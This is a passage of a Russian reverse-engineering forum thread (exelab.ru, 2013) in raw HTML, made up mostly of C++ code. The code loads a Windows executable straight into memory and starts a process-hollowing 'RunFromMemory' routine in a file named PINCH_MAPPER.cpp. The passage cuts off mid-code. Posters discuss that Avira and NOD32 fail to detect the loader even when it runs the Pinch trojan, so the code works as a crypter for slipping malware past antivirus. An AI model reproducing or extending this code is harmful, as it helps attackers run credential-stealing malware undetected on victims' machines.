class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualFree<span class="hl_char">(</span>ImageBase<span class="hl_char">,</span>&nbsp;<span class="hl_number">0</span><span class="hl_char">,</span>&nbsp;MEM_RELEASE<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">.</span><span class="hl_char">.</span><span class="hl_char">.</span>&nbsp;<span class="hl_function"><b>and</b></span>&nbsp;copy&nbsp;initialization&nbsp;<span class="hl_function">data</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionBase&nbsp;<span class="hl_char">=</span>&nbsp;ImageBase<span class="hl_char">+</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>VirtualAddress<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwSize&nbsp;<span class="hl_char">=</span>&nbsp;MIN<span class="hl_char">(</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>SizeOfRawData<span class="hl_char">,</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>Misc<span class="hl_char">.</span>VirtualSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span>SectionBase<span class="hl_char">,</span>&nbsp;<span class="hl_function">data</span><span class="hl_char">+</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>PointerToRawData<span class="hl_char">,</span>dwSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;pImportDscrtr&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>IMAGE_IMPORT_DESCRIPTOR&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>DataDirectory<span class="hl_char">[</span>IMAGE_DIRECTORY_ENTRY_IMPORT<span class="hl_char">]</span><span class="hl_char">.</span>VirtualAddress<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;<span class="hl_char">(</span><span class="hl_comment">;pImportDscrtr-&gt;Name!=0; pImportDscrtr++)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;pLibName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>PCHAR<span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pImportDscrtr<span class="hl_char">-</span><span class="hl_char">&gt;</span>Name<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;pImortName&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HMODULE&nbsp;hLibModule&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;LoadLibraryA<span class="hl_char">(</span>pLibName<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">*</span>pImport&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function">NULL</span><span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">*</span>pAddress&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;ProcAddress<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pAddress<span class="hl_char">=</span><span class="hl_char">(</span><span class="hl_function"><b>DWORD</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pImportDscrtr<span class="hl_char">-</span><span class="hl_char">&gt;</span><span class="hl_char">/</span><span class="hl_char">*</span>Original<span class="hl_char">*</span><span class="hl_char">/</span>FirstThunk<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>pImportDscrtr<span class="hl_char">-</span><span class="hl_char">&gt;</span>TimeDateStamp<span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pImport<span class="hl_char">=</span><span class="hl_char">(</span><span class="hl_function"><b>DWORD</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pImportDscrtr<span class="hl_char">-</span><span class="hl_char">&gt;</span>FirstThunk<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pImport<span class="hl_char">=</span><span class="hl_char">(</span><span class="hl_function"><b>DWORD</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pImportDscrtr<span class="hl_char">-</span><span class="hl_char">&gt;</span>OriginalFirstThunk<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;<span class="hl_char">(</span>i<span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">; pImport[i]!=0; i++)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>IsImportByOrdinal<span class="hl_char">(</span>pImport<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">)</span><span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcAddress<span class="hl_char">=</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>GetProcAddress<span class="hl_char">(</span>hLibModule<span class="hl_char">,</span>&nbsp;<span class="hl_char">(</span>PCHAR<span class="hl_char">)</span><span class="hl_char">(</span>pImport<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">&amp;</span>0xFFFF<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>else</b></span>&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;<span class="hl_function"><b>import</b></span>&nbsp;by&nbsp;name</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pImortName<span class="hl_char">=</span><span class="hl_char">(</span>PCHAR<span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span><span class="hl_char">(</span>pImport<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">)</span><span class="hl_char">+</span><span class="hl_number">2</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcAddress<span class="hl_char">=</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>GetProcAddress<span class="hl_char">(</span>hLibModule<span class="hl_char">,</span>&nbsp;pImortName<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pAddress<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">=</span>ProcAddress<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;<span class="hl_function"><b>section</b></span>&nbsp;protection</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;<span class="hl_char">(</span>i<span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">; i&lt;pFileHeader-&gt;NumberOfSections; i++)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtect<span class="hl_char">(</span><span class="hl_char">(</span>PVOID<span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>VirtualAddress<span class="hl_char">)</span><span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>Misc<span class="hl_char">.</span>VirtualSize<span class="hl_char">,</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetSectionProtection<span class="hl_char">(</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>Characteristics<span class="hl_char">)</span><span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">&amp;</span>dwOldProt<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>call</b></span>&nbsp;MainFunc</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>AddressOfEntryPoint<span class="hl_char">!</span><span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>pointMAIN&nbsp;pWinMain<span class="hl_char">=</span><span class="hl_char">(</span>pointMAIN<span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>AddressOfEntryPoint<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pointWINMAIN&nbsp;pWinMain<span class="hl_char">=</span><span class="hl_char">(</span>pointWINMAIN<span class="hl_char">)</span><span class="hl_char">(</span>ImageBase<span class="hl_char">+</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>AddressOfEntryPoint<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span><span class="hl_char">!</span>pWinMain<span class="hl_char">(</span><span class="hl_char">(</span>HINSTANCE<span class="hl_char">)</span>ImageBase<span class="hl_char">,</span>&nbsp;<span class="hl_function">NULL</span><span class="hl_char">,</span>&nbsp;<span class="hl_number">0</span><span class="hl_char">,</span>&nbsp;SW_SHOWNORMAL<span class="hl_char">)</span><span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualFree<span class="hl_char">(</span>ImageBase<span class="hl_char">,</span>&nbsp;<span class="hl_number">0</span><span class="hl_char">,</span>&nbsp;MEM_RELEASE<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_char">(</span>HMODULE<span class="hl_char">)</span>ImageBase<span class="hl_comment">;</span></li>        </ol>
    </div>
</div></div><br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332017&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=1" class="addthx" data-post="332017"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr><td class=caption4 colspan=2></td></tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="2" onfocus="this.blur()" href="JavaScript:di('[b]SReg[/b]','')">SReg</a></b><br></div>
<img src="img/s7.gif" alt=""><br><span class=txtSm>Ранг: 315.1 (мудрец), 631thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 11.78'>Активность: 0.3<span style='color:green'>&nearr;</span>0.33</span><br>Статус: <a href="action=userinfo&amp;user=18316">Модератор</a><br><font color=blue>CrackLab</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 15:16 <br><script type="text/javascript">QU('SReg','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=SReg" target="_blank">Личное сообщение</a> &middot;  <a href="#2" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#2');return false;">#2</a> </span><div align=left><br>
<I>Crawler пишет:<br>Авира</I><br>Тоже мне антивирусник... ты бы еще Иммунитетом проверял <img src="img/smilies/s1.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332019&amp;user=18316&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=2" class="addthx" data-post="332019"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="3" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 17:55 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#3" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#3');return false;">#3</a> </span><div align=left><br>
<b>SReg</b>, да и NOD32 не находит ни фига
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332024&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=3" class="addthx" data-post="332024"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="4" onfocus="this.blur()" href="JavaScript:di('[b]Gideon Vi[/b]','')">Gideon Vi</a></b><br></div>
<img src="img/s9.gif" alt=""><br><img style="padding-top:3px;" src="av/2585.jpg" alt=""><br><span class=txtSm>Ранг: 1131.7 <b><u>(!!!!)</u></b>, 447thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.83'>Активность: 0.67<span style='color:red'>&searr;</span>0.2</span><br>Статус: <a href="action=userinfo&amp;user=2585">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 18:18 <br><script type="text/javascript">QU('Gideon Vi','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Gideon Vi" target="_blank">Личное сообщение</a> &middot;  <a href="#4" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#4');return false;">#4</a> </span><div align=left><br>
Ну, висит тело в памяти, в неисполняемом состоянии. Зачем его проверять? Попробуй так на выполнение запустить.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332025&amp;user=2585&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=4" class="addthx" data-post="332025"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="5" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 19:12 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#5" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#5');return false;">#5</a> </span><div align=left><br>
<I>Gideon Vi пишет:<br> в неисполняемом состоянии </I><br><br>В том-то и дело, что в исполняемом состоянии. Код, который ниже, использует 2 файла для склейки в памяти. В целом определяться должно как crypt/xpack.gen (если хранится на диске, так и детектится). Но не определяет, даже если форкнуть пинча:<br><br>
<div class="hl_container">
<div class="hl_header">Code:</div>
<div class="hl_scroll_part_large">
    <div class="hl_normal"> 
        <ol class="hl_main"><li class="hl_l0"><span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;PINCH_MAPPER<span class="hl_char">.</span>cpp<span class="hl_char">:</span>&nbsp;определяет&nbsp;точку&nbsp;входа&nbsp;для&nbsp;консольного&nbsp;приложения<span class="hl_char">.</span></li><li class="hl_l1"><span class="hl_char">/</span><span class="hl_char">/</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">#include&nbsp;<span class="hl_quote">&quot;stdafx.h&quot;</span></li><li class="hl_l0">#include&nbsp;<span class="hl_char">&lt;</span>iostream<span class="hl_char">&gt;</span></li><li class="hl_l1">#include&nbsp;<span class="hl_char">&lt;</span>fstream<span class="hl_char">&gt;</span></li><li class="hl_l0">#include&nbsp;<span class="hl_char">&lt;</span>stdio<span class="hl_char">.</span>h<span class="hl_char">&gt;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">#include&nbsp;<span class="hl_char">&lt;</span>Windows<span class="hl_char">.</span>h<span class="hl_char">&gt;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">using&nbsp;namespace&nbsp;<span class="hl_function"><b>std</b></span><span class="hl_comment">;</span></li><li class="hl_l1">long&nbsp;fisize&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">long&nbsp;fill_buffer&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">,</span>&nbsp;<span class="hl_function"><b>BYTE</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">typedef&nbsp;long&nbsp;<span class="hl_function"><b>int</b></span>&nbsp;<span class="hl_char">(</span>__stdcall<span class="hl_char">*</span>&nbsp;NtUnmapViewOfSectionF<span class="hl_char">)</span><span class="hl_char">(</span>HANDLE<span class="hl_char">,</span>PVOID<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">NtUnmapViewOfSectionF&nbsp;NtUnmapViewOfSection&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>NtUnmapViewOfSectionF<span class="hl_char">)</span>GetProcAddress<span class="hl_char">(</span>LoadLibrary<span class="hl_char">(</span>&nbsp;&nbsp;<span class="hl_quote">L&quot;ntdll.dll&quot;</span><span class="hl_char">)</span><span class="hl_char">,</span><span class="hl_quote">&quot;NtUnmapViewOfSection&quot;</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1"><span class="hl_function"><b>void</b></span>&nbsp;RunFromMemory<span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span>&nbsp;pImage<span class="hl_char">)</span></li><li class="hl_l0">{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwWritten&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwHeader&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">; </span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwImageSize&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwSectionCount&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwSectionSize&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;firstSection&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;previousProtection&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;jmpSize&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_NT_HEADERS&nbsp;INH<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_DOS_HEADER&nbsp;IDH<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_SECTION_HEADER&nbsp;Sections<span class="hl_char">[</span><span class="hl_number">1000</span><span class="hl_char">]</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;PROCESS_INFORMATION&nbsp;peProcessInformation<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;STARTUPINFO&nbsp;peStartUpInformation<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT&nbsp;pContext<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">char</span><span class="hl_char">*</span>&nbsp;pMemory<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">char</span><span class="hl_char">*</span>&nbsp;pFile<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>char</b></span>&nbsp;pPath<span class="hl_char">[</span>MAX_PATH<span class="hl_char">]</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span 